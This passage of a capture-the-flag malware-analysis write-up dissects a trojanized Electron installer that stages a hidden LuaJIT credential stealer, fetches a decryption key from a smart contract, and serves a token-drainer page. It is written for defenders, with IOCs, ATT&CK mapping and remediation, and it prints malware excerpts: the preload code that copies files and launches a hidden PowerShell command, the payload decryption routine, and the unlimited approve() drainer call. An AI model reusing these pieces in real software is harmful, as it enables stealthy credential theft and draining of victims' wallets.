# → app/ holds the full Electron tree: TrustSettle.exe, resources/app.asar,
#   extraResources/ (api.txt, luajit.exe, lua51.dll, .env), src/, locales/…
```

The mere presence of `extraResources/` with an interpreter (`luajit.exe`) and a text script (`api.txt`) is already a red flag: legitimate binaries rarely carry an alternate runtime to execute loose scripts.

#### 2 · Open `app.asar` without `asar`

An `.asar` is a `pickle` archive: an 8-byte header, a `uint32` with the header pickle size, then a **JSON** mapping each file to `{size, offset}` inside the data region. It parses in 15 lines of Node:

```js
const fs = require('fs');
const b = fs.readFileSync('resources/app.asar');
const jlen  = b.readUInt32LE(12);          // header JSON length
const cbase = 8 + b.readUInt32LE(4);       // base of the content region
const hdr   = JSON.parse(b.toString('utf8', 16, 16 + jlen));
function dump(node, prefix='') {
  for (const k in node.files) {
    const f = node.files[k], np = prefix + '/' + k;
    if (f.files) dump(f, np);
    else fs.writeFileSync('out' + np.replace(/\//g,'_'),
                          b.slice(cbase + +f.offset, cbase + +f.offset + f.size));
  }
}
dump(hdr);
```

The files that matter are tiny: `main.js` (812 bytes) and `preload.js` (5,833 bytes). Everything else is `node_modules`.

#### 3 · Read `main.js` → the insecure config that enables it all

`main.js` holds no malicious logic, but it **opens the door**: it creates the window with the three options Electron explicitly discourages for security, and hooks a `preload.js`:

```js
mainWindow = new BrowserWindow({
  width: 800, height: 600,
  webPreferences: {
    contextIsolation: false,       // ⚠️ preload shares context with the web page
    nodeIntegration: true,         // ⚠️ the renderer has Node access
    nodeIntegrationInWorker: true, // ⚠️ …in workers too
    preload: path.join(__dirname, 'preload.js')
  }
});
mainWindow.loadFile(`${__dirname}/src/index.html`);
```

`contextIsolation:false` + `nodeIntegration:true` means `preload.js` can use `fs`, `child_process`, `require('ethers')`… with full process privileges. The `index.html` it loads is a **facade**: a memory game (`renderer.js` has a `gameState` with cards and matches) whose `DOMContentLoaded` calls `window.appVault.initialize()` — the API the `preload.js` exposes. The game is the decoy; the preload is the weapon.

#### 4 · Dissect `preload.js` → Q1, Q4, Q5 (FLAG) and Q6

All the Electron-side behavior lives here, in the clear. As soon as it loads, and **before** any window is shown, the preload copies `extraResources` and launches the hidden interpreter:

```js
// Q1 — copies ALL of extraResources → C:\Users\Public
fs.readdirSync(path.resolve(`${process.resourcesPath}/../extraResources`))
  .forEach(f => fs.copyFileSync(
      path.resolve(`${process.resourcesPath}/../extraResources`, f),
      path.join('C:\\Users\\Public', f)));

// launches the hidden Lua via PowerShell (hidden window, policy bypass)
exec("powershell.exe -exec bypass -w hidden -nop -c "
   + "\"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
```

→ **Q1 = `C:\Users\Public`** (staging directory; also world-writable by default, ideal for planting the `.env` lure).

Then comes the crypto part. `preload.js` carries an encrypted blob and the logic to decrypt it, but **the key is not in the file**:

```js
const CONTRACT_ADDRESS = '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
const RPC_URL = 'https://ethereum-sepolia-rpc.publicnode.com';
const CONTRACT_ABI = ['function resolveState() view returns (bytes32)'];  // ← Q4
const ENCRYPTED_DATA =
  '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8'
+ 'f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa'
+ '2c4c4e1bbfc6204207fe5c801d201f5af84864f0';

function decryptEmbeddedData(encryptedData, encryptionKey) {
  const data = hexToBuffer(encryptedData), key = hexToBuffer(encryptionKey);
  const magicConstant = 0x42, rotationBits = 7;
  const result = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    const step1 = data[i] ^ key[i % key.length];              // 1) XOR with the key
    const step2 = ((step1 << rotationBits) | (step1 >>> (8 - rotationBits))) & 0xff; // 2) ROL 7
    result[i]  = step2 ^ magicConstant;                        // 3) XOR 0x42
  }
  return result.toString('utf8');
}
```

The key is delivered by the contract's `resolveState()` (→ **Q4 = `resolveState()`**). It is an **on-chain dead-drop resolver** pattern: the attacker can rotate the key (or kill-switch the malware) by changing contract state, and pure static analysis goes blind. But a read-only `eth_call` reveals it without signing anything:

```bash
curl -s https://ethereum-sepolia-rpc.publicnode.com -X POST \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
        {"to":"0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1","data":"0x77b3774c"},"latest"]}'
# → "result":"0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"
```

The selector `0x77b3774c` = `keccak256("resolveState()")[:4]` (verifiable with `python3 -c 'from Crypto.Hash import keccak; …'`). With the `bytes32` key, apply the `preload.js` algorithm:

```python
enc="560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0"
key=bytes.fromhex("3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4")
out=bytearray()
for i,b in enumerate(bytes.fromhex(enc)):
    s1=b^key[i%len(key)]
    s2=((s1<<7)|(s1>>1))&0xff        # ROL 7 ≡ ROR 1
    out.append(s2^0x42)
print(out.decode())
# → start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

The decrypted text is a **command** that opens the drainer HTML and `echo`s an operation marker:

```
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

→ **Q5 (FLAG) = `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`**. The name **NAPOLEON** ties the challenge to the arc's actor. And because the command references `%TEMP%\settlement.html`, it confirms → **Q6 = `%TEMP%`** (the `preload` writes/opens the drainer HTML from the temp directory before executing the command with `exec(decrypted)`).

> **Technical nuance:** in the real flow, `initializeVault()` first writes `settlement.html` near the install root, queries `resolveState()`, decrypts, and **executes** `exec(decrypted)` — which is the `start "" "%TEMP%\settlement.html"…`. So the decrypted command itself pins the HTML being served from `%TEMP%`. `renderer.js` rounds it off by printing to the facade console `[KEY] <key>` and `[DECRYPTED] <command>`.

#### 5 · Deobfuscate `api.txt` (Lua) → Q2 and Q3

`api.txt` begins with `return(function(...)local z={"n$d\"Rqd]a*[";…}` — a table of obfuscated strings and a VM interpreter: the unmistakable signature of the **Prometheus** obfuscator for LuaJIT. Deobfuscating the bytecode by hand is slow and unnecessary. The technique that works is **instrument, don't decrypt**: run the script under `lua5.4` with **fake** `ffi` and `bit` that make no real syscalls, only **log** what the malware asks for:

```lua
-- fake_ffi.lua (skeleton)
local log = {}
local ffi = {}
function ffi.cdef(s)      table.insert(log, "CDEF: "..s)        end
function ffi.load(name)   table.insert(log, "LOAD: "..tostring(name))
  return setmetatable({}, {__index=function(_,k)
     table.insert(log, "CALL: "..k); return function() return 0 end end}) end
ffi.new=function() return {} end;  ffi.string=function() return "" end
package.loaded.ffi = ffi
package.loaded.bit = { band=function() return 0 end, bor=function() return 0 end,
                       bxor=function() return 0 end, lshift=function() return 0 end,
                       rshift=function() return 0 end }
-- wrap os.getenv to log which variables it queries
local realgetenv = os.getenv
os.getenv = function(k) table.insert(log, "GETENV: "..k); return realgetenv(k) end
-- … after loading api.txt, dump `log`
```

The log reveals the whole machinery without running anything dangerous:

- It declares and calls **`ReadDirectoryChangesW`** pointing at `C:\Users\Public\`; the output buffer of that API is the Win32 structure **`FILE_NOTIFY_INFORMATION`** (with `Action`, `FileNameLength`, `FileName[]`…) → **Q2 = `FILE_NOTIFY_INFORMATION`**.
- When the `.env` appears, it reads it and builds an HTTP request with the **WinHTTP** family: `WinHttpOpen` → `WinHttpConnect` → `WinHttpOpenRequest` → **`WinHttpSendRequest`** (the actual send of the body with the `PRIVATE_KEY`) → **Q3 = `WinHttpSendRequest`**.

In other words: the Lua is a **filesystem-event-driven credential stealer** that patiently waits for the victim to follow the `README.md` instructions.

#### 6 · Analyze `settlement.html` → Q7, Q8 and Q9

The page is a textbook drainer disguised as "Terms of Service" (it even carries a red-striped "training" banner, for the CTF context). The key actors:

```js
const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D"; // spender / drainer
const MOCK_TOKEN_ADDRESS  = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2"; // token
…
provider = new ethers.BrowserProvider(window.ethereum);   // ← Q9
await provider.send("eth_requestAccounts", []);
signer = await provider.getSigner();
…
const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
const unlimitedAmount = ethers.MaxUint256;                 // ← Q8
const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount); // ← Q7
```

- **Q9 = `BrowserProvider`** — the ethers.js **v6** class to talk to the browser's injected wallet (`window.ethereum`/MetaMask). In v5 this was `Web3Provider`; the rename is the version tell.
- **Q7 = `approve()`** — the ERC-20 function that grants spending permission to a third party. Selector `0x095ea7b3` = `keccak256("approve(address,uint256)")[:4]`.
- **Q8 = `115792089237316195423570985008687907853269984665640564039457584007913129639935`** = `ethers.MaxUint256` = 2²⁵⁶−1. Approving that maximum is an **unmistakable drainer signature**: you give the attacker's contract permission to move **all** your tokens, forever, with a single signature.

#### 7 · Beat the "drainer" contract puzzle → Q10 (FLAG)

The `spender` `0x69Bf…709D` is not verified on Etherscan or Sourcify, so we must **disassemble its bytecode** (fetched with `eth_getCode`) to map the dispatcher. The function selector table exposes five methods:

```
0bfac020   282940a7   343943bd   8f7f391e   f8e6e11f
```

Calling them via `eth_call` (view) reveals the puzzle logic, with `revert` messages seeded as hints ("`not quite - keep analyzing`", "`only hidden owner`", "`already set`"):

- `282940a7()` **publicly** returns the *hidden owner*: `0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a`.
- `343943bd()` returns the token address.
- `f8e6e11f(address)` returns a **string**, but only if the argument **equals the hidden owner** (otherwise it reverts with "only hidden owner").

The trick: the secret's "guardian" (`f8e6e11f`) demands the hidden owner, but the contract itself **leaks who** that owner is via `282940a7()`. Nothing stops you from passing that address as an *argument* in a read-only `eth_call` (it checks the parameter, not `msg.sender`):

```bash
# 1) get the hidden owner
curl -s $RPC -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
  {"to":"0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D","data":"0x282940a7"},"latest"]}'
# → ...ebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a

# 2) ask for the secret passing that owner as argument (ABI: selector + padded address)
curl -s $RPC -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
  {"to":"0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D",
   "data":"0xf8e6e11f000000000000000000000000ebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a"},"latest"]}'
# → ABI-string "51.5049,0.0348"
```

→ **Q10 (FLAG) = `51.5049,0.0348`** — coordinates near **Greenwich / London** (reference meridian, a Holmesian nod). It is the operation's *dead drop*, hidden in plain sight on the public blockchain.

Everything was **static + read-only RPC**: the **`.exe` was never run** and no transaction was ever signed.

### Timeline

| # | Phase | Malware / analyst action |
|---|-------|--------------------------|
| 1 | Delivery | Victim downloads `TrustSettle 1.0.0.exe` (trojanized NSIS installer, op_sparkling). |
| 2 | Install | NSIS unpacks the Electron app; `README.md` asks to put the wallet `.env` in `C:\Users\Public\`. |
| 3 | Execution | On launch, `main.js` creates the window with `nodeIntegration:true` and loads `preload.js`. |
| 4 | Staging | `preload.js` copies all of `extraResources/` to `C:\Users\Public\` (incl. `luajit.exe`, `api.txt`). |
| 5 | Hidden run | Launches `powershell -exec bypass -w hidden` → `luajit.exe api.txt` (background watcher). |
| 6 | Key retrieval | `preload.js` calls `resolveState()` on Sepolia and gets the decryption key on-chain. |
| 7 | Local detonation | Decrypts the command (XOR→ROL7→XOR 0x42) and runs it: opens `settlement.html` from `%TEMP%`. |
| 8 | Passive theft | The Lua watches `C:\Users\Public\` (`ReadDirectoryChangesW`); when the `.env` appears, reads it. |
| 9 | Exfiltration | Sends the `PRIVATE_KEY` over HTTPS with `WinHttpSendRequest`. |
| 10 | Active theft | The HTML induces `approve(drainer, MaxUint256)`; the attacker drains the wallet's tokens. |
| 11 | Dead drop | The drainer contract holds the operation coordinates, readable with `eth_call`. |

### IOCs

| Type | Indicator | Context |
|------|-----------|---------|
| File | `TrustSettle 1.0.0.exe` — SHA-256 `c366e00a4ac1b4df56d1e4e7bb94e1c10937f86cffde733424fb7c7dd5a444fc` | Trojanized NSIS installer |
| File | `app.asar` — SHA-256 `0fdc33c11fec2092cd3350f02ecad7b676898cd2a77b8b67dd99360009ac8e82` | Malicious Electron bundle |
| File | `api.txt` — SHA-256 `ac70e86efcc0fb7d32757546bbe6a4fb735eadda19387cb29be32eaaffc67c59` | Obfuscated Lua (Prometheus) — stealer |
| File | `settlement.html` — SHA-256 `fb8597acf4f7bf09223c269060ca1c3b5c454605caddd08a6e4eb89d4f81195b` | Drainer page |
| File | `README.md` — SHA-256 `678d8120db0e0d9dc09c687ba116d3d36c0925d99d7f38a7023377b5db015c48` | Social-engineering lure |
| Path | `C:\Users\Public\{luajit.exe,api.txt,.env}` | Staging/monitoring directory |
| Process | `powershell.exe -exec bypass -w hidden -nop -c … luajit.exe … api.txt` | Hidden launcher |
| Win32 API | `ReadDirectoryChangesW`, `WinHttpSendRequest` | FS monitoring + exfil |
| Contract (Sepolia) | `0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1` | Key dead drop (`resolveState()`) |
| Contract (Sepolia) | `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D` | Drainer / `approve` `spender` |
| Contract (Sepolia) | `0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2` | Token targeted by the drainer |
| Address | `0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a` | "Hidden owner" (puzzle key) |
| Selector | `0x77b3774c` (`resolveState()`), `0x095ea7b3` (`approve`) | Key selectors |
| Key | `0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4` | Decryption key (bytes32) |
| RPC | `https://ethereum-sepolia-rpc.publicnode.com` | Endpoint used by the malware |
| String | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` | Operation marker (payload) |
| Coordinates | `51.5049,0.0348` | Drainer-contract dead drop (Greenwich) |

### MITRE ATT&CK mapping

| Tactic | Technique | ID | Evidence in the sample |
|--------|-----------|----|------------------------|
| Initial Access | Compromise Software Supply Chain | T1195.002 | Legit-looking `TrustSettle` installer, trojanized |
| Execution | User Execution: Malicious File | T1204.002 | Victim runs the installer and follows the `README` |
| Execution | Command & Scripting Interpreter: PowerShell | T1059.001 | `powershell -exec bypass -w hidden … luajit.exe` |
| Execution | Command & Scripting Interpreter: JavaScript | T1059.007 | Malicious logic in `preload.js` (Electron/Node) |
| Execution | Native API | T1106 | Lua via LuaJIT `ffi` calls Win32 APIs |
| Defense Evasion | Obfuscated Files or Information | T1027 | Lua VM (Prometheus) + XOR/ROL/XOR payload |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | Malware decrypts its own command at runtime |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `-w hidden` in the PowerShell launcher |
| Collection | Data Staged: Local Data Staging | T1074.001 | Copies `extraResources` to `C:\Users\Public` |
| Collection | Automated Collection | T1119 | `ReadDirectoryChangesW` watcher on the `.env` |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | `PRIVATE_KEY` in the wallet `.env` |
| Command & Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS exfil over WinHTTP |
| Command & Control | Web Service: Dead Drop Resolver | T1102.001 | `resolveState()` on-chain delivers the key |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | `WinHttpSendRequest` sends the `PRIVATE_KEY` |
| Impact | Financial Theft | T1657 | `approve(MaxUint256)` → token draining |

### Detection and remediation

**Detection (host):**

- **Writes/reads in `C:\Users\Public\` of `.env`, `luajit.exe`, `api.txt`** — a world-writable directory used for staging/monitoring is highly suspicious.
- **Sysmon/EDR**: child `powershell.exe` with `-exec bypass -w hidden -nop` spawned by an Electron app (`TrustSettle.exe`), especially running an unsigned `luajit.exe`.
- **`WinHttpSendRequest` from a `luajit.exe`** loading `lua51.dll` — a Lua interpreter has no business making outbound network calls.
- **YARA/hashes** over the IOC table; a rule for the pattern `local z={` + `ffi.cdef` + `ReadDirectoryChangesW` inside a `.txt`.

**Detection (on-chain / wallet):**

- Alert on any `approve(spender, 2^256-1)` to an **unverified** contract; modern wallets should show the "unlimited" amount in red.
- Monitor the IOC addresses/tokens on Sepolia.

**Remediation:**

- **Containment**: kill `luajit.exe`; delete `C:\Users\Public\{luajit.exe,api.txt,.env}`; uninstall TrustSettle; block the hashes.
- **Crypto**: assume the `PRIVATE_KEY` is compromised → **rotate the wallet** (move funds to a fresh one) and **revoke all `approve`s** (e.g. `revoke.cash`), especially toward `0x69Bf…709D`.
- **Electron hardening**: `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true`, and sign/allowlist internal Electron apps.
- **Hygiene**: never store private keys in a `.env` on disk; use hardware wallets/encrypted keystores; distrust installers that copy binaries to `C:\Users\Public`.

### Answers / flags

| # | Question | Answer |
|---|----------|--------|
| 1 | Which directory does the app copy the `extraResources` files to? | `C:\Users\Public` |
| 2 | Win32 structure defining the buffer format when monitoring directory changes | `FILE_NOTIFY_INFORMATION` |
| 3 | Win32 API used by the Lua script to send the HTTP request | `WinHttpSendRequest` |
| 4 | Smart-contract function that returns the decryption key | `resolveState()` |
| 5 | **FLAG** — decode the encrypted payload | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| 6 | Environment variable of the directory where the app copies the HTML | `%TEMP%` |
| 7 | Token function the HTML page calls to request spending permission | `approve()` |
| 8 | Exact token amount passed to the approval call | `115792089237316195423570985008687907853269984665640564039457584007913129639935` (`ethers.MaxUint256`, 2²⁵⁶−1) |
| 9 | ethers.js v6 provider class used to connect to the browser wallet | `BrowserProvider` |
| 10 | **FLAG** — hidden contract | `51.5049,0.0348` |

### Lessons

- **Electron apps are code, not black boxes.** An `app.asar` opens trivially (`asar extract` or parsing the header with Node in 15 lines); `main.js`/`preload.js` usually hold all the malicious logic in the clear. The insecure `webPreferences` (`nodeIntegration:true`, `contextIsolation:false`) is what turns a preload into a weapon.
- **`extraResources` + an embedded interpreter is a red flag.** A legitimate installer rarely carries a `luajit.exe` to copy into `C:\Users\Public` and launch hidden via PowerShell.
- **Lua obfuscation is beaten by instrumenting, not hand-decrypting.** A fake `ffi`/`bit` that logs `cdef`s, Win32 APIs and `getenv` reveals the VM's behavior in minutes, without detonating the real malware.
- **Keys and secrets "off-chain by design" are still readable.** Storing the key in a `resolveState()` (dead-drop resolver, T1102.001) frustrates pure static analysis, but a read-only `eth_call` hands it over anyway. Same with the drainer puzzle: the blockchain itself leaks the "hidden owner".
- **`approve(spender, MaxUint256)` = drainer.** An unlimited spending approval is the unmistakable signature of a token theft; never grant it to an unverified contract, and revoke approvals periodically.
- **DFIR without detonating.** The whole challenge was solved with static analysis and read-only RPC: never run the sample or sign transactions to "confirm".

### Series · The Reichenbach Directive

| # | Scenario | Link |
|---|----------|------|
| **S01** | **Silent Dividend** *(current)* | [../2026-09-15-holmes2026-s01-silent-dividend/](../2026-09-15-holmes2026-s01-silent-dividend/) |
| S02 | Bottle Out | [../2026-09-16-holmes2026-s02-bottle-out/](../2026-09-16-holmes2026-s02-bottle-out/) |
| S03 | Whisper Chain | [../2026-09-17-holmes2026-s03-whisper-chain/](../2026-09-17-holmes2026-s03-whisper-chain/) |
| S04 | Paper Ghost | [../2026-09-18-holmes2026-s04-paper-ghost/](../2026-09-18-holmes2026-s04-paper-ghost/) |
| S05 | Poisoned Branch | [../2026-09-19-holmes2026-s05-poisoned-branch/](../2026-09-19-holmes2026-s05-poisoned-branch/) |
| S06 | Silent Passenger | [../2026-09-20-holmes2026-s06-silent-passenger/](../2026-09-20-holmes2026-s06-silent-passenger/) |
| S07 | Iron Feather | [../2026-09-21-holmes2026-s07-iron-feather/](../2026-09-21-holmes2026-s07-iron-feather/) |
| S08 | Borrowed Name | [../2026-09-22-holmes2026-s08-borrowed-name/](../2026-09-22-holmes2026-s08-borrowed-name/) |
| S09 | Last Light | [../2026-09-23-holmes2026-s09-last-light/](../2026-09-23-holmes2026-s09-last-light/) |
